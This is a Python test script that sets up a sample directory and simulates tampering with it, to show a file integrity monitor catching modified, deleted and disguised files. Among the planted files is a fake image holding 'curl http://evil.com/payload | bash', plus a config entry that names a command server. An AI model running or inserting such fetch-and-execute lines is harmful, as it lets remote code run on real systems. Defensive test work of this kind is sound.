#!/usr/bin/env python3
"""
simulate_attack.py — Creates a test environment to demonstrate FIM detection.
Run this AFTER creating the baseline to simulate real-world attacks.
"""

import os
import shutil

TEST_DIR = "./test_env"

def setup_test_environment():
    """Create a clean test directory with sample files."""
    os.makedirs(TEST_DIR, exist_ok=True)

    # Normal files
    with open(f"{TEST_DIR}/readme.txt", "w") as f:
        f.write("This is a legitimate readme file.\n")

    with open(f"{TEST_DIR}/config.json", "w") as f:
        f.write('{"debug": false, "version": "1.0"}\n')

    with open(f"{TEST_DIR}/script.py", "w") as f:
        f.write("# legitimate python script\nprint('hello')\n")

    os.makedirs(f"{TEST_DIR}/images", exist_ok=True)
    # Fake PNG — actually a Python script disguised as an image
    with open(f"{TEST_DIR}/images/logo.png", "w") as f:
        f.write("# This is NOT an image — it is malicious Python code\nimport os; os.system('whoami')\n")

    print("[+] Test environment created at ./test_env")
    print("    Files: readme.txt, config.json, script.py, images/logo.png")
    print("\n[*] Step 1: Create baseline BEFORE attack simulation:")
    print("    python fim.py baseline ./test_env -o baseline.json\n")


def simulate_attack():
    """Simulate real-world attack: modify, delete, add, and plant disguised malware."""
    print("[*] Simulating attack scenarios...\n")

    # Attack 1: Modify an existing legitimate file
    with open(f"{TEST_DIR}/config.json", "w") as f:
        f.write('{"debug": true, "backdoor": "enabled", "c2": "evil.com"}\n')
    print("[!] Attack 1: config.json modified (backdoor injected)")

    # Attack 2: Delete a legitimate file
    os.remove(f"{TEST_DIR}/script.py")
    print("[!] Attack 2: script.py deleted (covering tracks)")

    # Attack 3: Add a new malicious file disguised as a JPG
    with open(f"{TEST_DIR}/update.jpg", "w") as f:
        f.write("#!/bin/bash\ncurl http://evil.com/payload | bash\n")
    print("[!] Attack 3: update.jpg added (shell script disguised as image)")

    # Attack 4: Add legitimate-looking new file
    with open(f"{TEST_DIR}/notes.txt", "w") as f:
        f.write("attacker left this note\n")
    print("[!] Attack 4: notes.txt added (new file planted)")

    print("\n[*] Step 2: Now run the scan to detect all changes:")
    print("    python fim.py scan ./test_env -b baseline.json -v\n")
    print("[*] Step 3: MIME-only check for disguised files:")
    print("    python fim.py mime-check ./test_env\n")


def cleanup():
    """Remove the test environment."""
    shutil.rmtree(TEST_DIR, ignore_errors=True)
    if os.path.exists("baseline.json"):
        os.remove("baseline.json")
    print("[+] Test environment cleaned up.")


if __name__ == "__main__":
    import sys
    if len(sys.argv) < 2:
        print("Usage:")
        print("  python simulate_attack.py setup    # Create test files")
        print("  python simulate_attack.py attack   # Simulate tampering")
        print("  python simulate_attack.py cleanup  # Remove test files")
        sys.exit(0)

    cmd = sys.argv[1]
    if cmd == "setup":
        setup_test_environment()
    elif cmd == "attack":
        simulate_attack()
    elif cmd == "cleanup":
        cleanup()
    else:
        print(f"Unknown command: {cmd}")
